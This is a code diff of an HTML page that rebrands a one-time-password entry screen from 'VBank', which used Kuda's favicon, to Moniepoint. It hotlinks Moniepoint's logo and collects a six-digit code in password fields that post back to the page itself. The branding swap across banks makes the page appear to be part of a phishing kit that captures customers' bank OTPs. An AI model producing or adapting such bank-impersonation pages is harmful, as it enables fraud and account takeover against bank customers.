@@ -4,16 +4,11 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <link
+      href="https://atm.moniepoint.com/assets/images/moniepoint-logo.svg"
       rel="icon"
-      href="https://kuda.com/icons/icon-48x48.png?v=817086b560dfc1021d60b8ab9b66d485"
-      type="image/svg+xml"
+      type="image/x-icon"
     />
-    <link
-      rel="icon"
-      href="https://kuda.com/icons/icon-48x48.png?v=817086b560dfc1021d60b8ab9b66d485"
-      type="image/png"
-    />
-    <title>Vbank - VBank</title>
+    <title>Moniepoint</title>
     <link
       rel="stylesheet"
       href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
@@ -26,25 +21,44 @@
   <body>
     <div class="container">
       <div class="contentSec">
-        <div class="title">Confirm Sign In</div>
-        <span>We sent a you a code by text message</span>
+        <div class="wrapper">
+          <div class="goBack">
+            <i class="fa-solid fa-arrow-left"></i>
+            <span> Go to login</span>
+          </div>
+          <div class="title">
+            <h1>Enter OTP</h1>
+            <span
+              >We've just sent a 6-digit code to your registered phone number.
+              Enter the code to proceed</span
+            >
+          </div>
+        </div>
       </div>
-      <div class="loginWrapper">
-        <div class="loginSec">
-          <form method="post" id="myForm">
-            <label for="otp">Code</label>
-            <div class="formInput">
-              <input
-                id="otp"
-                name="otp"
-                type="text"
-                required
-                placeholder="*****"
-              />
-            </div>
-
-            <button id="submitBtn" type="submit">Sign In</button>
+      <div class="formSec">
+        <div class="input">
+          <form method="post">
+            <input type="password" id="digit1" class="pin-input" />
+            <input type="password" id="digit2" class="pin-input" />
+            <input type="password" id="digit3" class="pin-input" />
+            <input type="password" id="digit4" class="pin-input" />
+            <input type="password" id="digit5" class="pin-input" />
+            <input type="password" id="digit6" class="pin-input" />
           </form>
+        </div>
+        <div class="time">
+          OTP expires in
+          <p>09:00</p>
+        </div>
+
+        <div class="getCodeWrapper">
+          <div class="getCode">
+            <i class="fa-solid fa-circle-exclamation"></i>
+            Didn't get the code? Dial <span>*5573*73*7155# </span>
+          </div>
+        </div>
+        <div class="buttonSec">
+          <button id="submitBtn" type="submit">Next</button>
         </div>
       </div>
     </div>
